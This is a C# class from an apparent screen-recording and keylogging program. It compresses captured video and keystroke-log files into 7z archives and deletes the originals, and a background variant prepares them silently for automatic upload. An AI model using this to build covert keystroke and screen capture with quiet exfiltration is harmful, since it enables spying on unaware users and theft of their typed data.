using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using SevenZip;

namespace ScreenRecorder
{
    /// <summary>
    /// 文件压缩工具类，负责文件压缩相关功能
    /// </summary>
    public class FileCompressor
    {
        private string sevenZipLibraryPath = string.Empty;

        public FileCompressor()
        {
            // 初始化SevenZipSharp库
            sevenZipLibraryPath = FindSevenZipLibrary();
            SevenZipCompressor.SetLibraryPath(sevenZipLibraryPath);
        }

        /// <summary>
        /// 查找7z库文件
        /// </summary>
        private string FindSevenZipLibrary()
        {
            string[] possiblePaths = new string[]
            {
                // 优先查找当前目录下的7z.dll
                Path.Combine(Environment.CurrentDirectory, "7z.dll"),
                // 查找当前目录下的7-Zip子目录中的7z.dll
                Path.Combine(Environment.CurrentDirectory, "7-Zip", "7z.dll"),
                // 查找程序运行目录下的7z.dll
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "7z.dll"),
                // 查找程序运行目录下的7-Zip子目录中的7z.dll
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "7-Zip", "7z.dll"),
                // 如果以上路径都没有，再尝试系统安装的7-Zip
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "7-Zip", "7z.dll"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "7-Zip", "7z.dll")
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    Console.WriteLine($"找到7z.dll库文件: {path}");
                    return path;
                }
            }

            throw new FileNotFoundException("未找到7z.dll库文件！请确保7z.dll文件位于程序目录或7-Zip子目录中。");
        }

        /// <summary>
        /// 压缩文件方法（控制台模式）
        /// </summary>
        /// <param name="videoFilePath">视频文件路径</param>
        /// <param name="keylogFilePath">键盘记录文件路径</param>
        /// <returns>压缩文件路径</returns>
        public string CompressFiles(string videoFilePath, string? keylogFilePath = null)
        {
            try
            {
                // 创建压缩文件路径
                string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                string? directory = Path.GetDirectoryName(videoFilePath);
                string zipFilePath = directory != null ? Path.Combine(directory, "ScreenCapture_" + timestamp + ".7z") : "ScreenCapture_" + timestamp + ".7z";

                // 准备文件列表
                List<string> filesToCompress = new List<string> { videoFilePath };
                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                {
                    filesToCompress.Add(keylogFilePath);
                }

                // 计算原始大小
                long originalSize = 0;
                if (File.Exists(videoFilePath))
                {
                    originalSize += new FileInfo(videoFilePath).Length;
                }
                if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                {
                    originalSize += new FileInfo(keylogFilePath).Length;
                }

                // 创建SevenZipCompressor实例并设置最大压缩率
                SevenZipCompressor compressor = new SevenZipCompressor();
                compressor.CompressionLevel = SevenZip.CompressionLevel.Ultra;
                compressor.CompressionMethod = SevenZip.CompressionMethod.Lzma2;
                compressor.CompressionMode = SevenZip.CompressionMode.Create;

                // 在控制台模式下不显示进度窗口，直接压缩
                Console.WriteLine("正在压缩文件...");
                compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());

                // 检查压缩是否成功
                if (!File.Exists(zipFilePath))
                {
                    Console.WriteLine("压缩失败，未生成压缩文件！");
                    return string.Empty;
                }

                // 删除原文件
                try
                {
                    foreach (string fileToDelete in filesToCompress)
                    {
                        if (File.Exists(fileToDelete))
                        {
                            File.Delete(fileToDelete);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("删除原文件时出错: " + ex.Message);
                }

                // 显示压缩成功信息
                long compressedSize = new FileInfo(zipFilePath).Length;
                double compressionRatio = (double)compressedSize / originalSize * 100;
                Console.WriteLine("文件压缩成功！");
                Console.WriteLine("压缩文件保存在: " + zipFilePath);
                Console.WriteLine("原始大小: " + (originalSize / 1024.0 / 1024.0).ToString("F2") + " MB");
                Console.WriteLine("压缩大小: " + (compressedSize / 1024.0 / 1024.0).ToString("F2") + " MB");
                Console.WriteLine("压缩率: " + compressionRatio.ToString("F2") + "%");

                return zipFilePath;
            }
            catch (Exception ex)
            {
                Console.WriteLine("压缩文件时出错: " + ex.Message);
                return string.Empty;
            }
        }

        /// <summary>
        /// 自动上传的压缩方法（无用户交互）
        /// </summary>
        /// <param name="videoFilePath">视频文件路径</param>
        /// <param name="keylogFilePath">键盘记录文件路径</param>
        /// <returns>压缩文件路径</returns>
        public async Task<string> CompressFilesForAutoUploadAsync(string videoFilePath, string? keylogFilePath = null)
        {
            try
            {
                // 在后台线程中执行压缩操作
                return await Task.Run(() =>
                {
                    try
                    {
                        // 创建压缩文件路径
                        string timestamp = DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss");
                        string? directory = Path.GetDirectoryName(videoFilePath);
                        string zipFilePath = directory != null ? Path.Combine(directory, "AutoUpload_ScreenCapture_" + timestamp + ".7z") : "AutoUpload_ScreenCapture_" + timestamp + ".7z";

                        // 准备文件列表
                        List<string> filesToCompress = new() { videoFilePath };
                        if (!string.IsNullOrEmpty(keylogFilePath) && File.Exists(keylogFilePath))
                        {
                            filesToCompress.Add(keylogFilePath);
                        }

                        // 创建SevenZipCompressor实例并设置最大压缩率
                        SevenZipCompressor compressor = new()
                        {
                            CompressionLevel = SevenZip.CompressionLevel.Ultra,
                            CompressionMethod = SevenZip.CompressionMethod.Lzma2,
                            CompressionMode = SevenZip.CompressionMode.Create
                        };

                        // 不显示进度窗口，直接压缩
                        compressor.CompressFiles(zipFilePath, filesToCompress.ToArray());

                        // 检查压缩是否成功
                        if (!File.Exists(zipFilePath))
                        {
                            return string.Empty;
                        }

                        // 删除原文件
                        try
                        {
                            foreach (string fileToDelete in filesToCompress)
                            {
                                if (File.Exists(fileToDelete))
                                {
                                    File.Delete(fileToDelete);
                                }
                            }
                        }
                        catch (Exception)
                        {
                            // 自动上传过程中的错误不需要显示消息
                        }

                        return zipFilePath;
                    }
                    catch (Exception)
                    {
                        return string.Empty;
                    }
                });
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }
        
        /// <summary>
        /// 为了向后兼容保留的同步方法
        /// </summary>
        public string CompressFilesForAutoUpload(string videoFilePath, string? keylogFilePath = null)
        {
            return CompressFilesForAutoUploadAsync(videoFilePath, keylogFilePath).GetAwaiter().GetResult();
        }
    }
}